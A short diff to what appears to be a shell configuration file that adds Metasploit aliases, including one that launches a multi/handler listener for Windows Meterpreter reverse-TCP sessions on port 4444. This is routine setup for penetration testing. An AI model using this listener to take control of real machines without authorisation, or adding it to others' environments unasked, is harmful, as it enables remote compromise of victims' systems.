@@ -20,4 +20,5 @@ fi
 if [ -d $HOME/metasploit-framework/ ]; then
     export PATH=$PATH:$HOME/metasploit-framework/:$HOME/metasploit-framework/tools/
     alias msfconsole="pushd $HOME/metasploit-framework/ && ./msfconsole && popd"
+    alias msfwin='pushd $HOME/metasploit-framework/ && ./msfconsole -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport 4444; set exitonsession false; run -j" && popd'
 fi
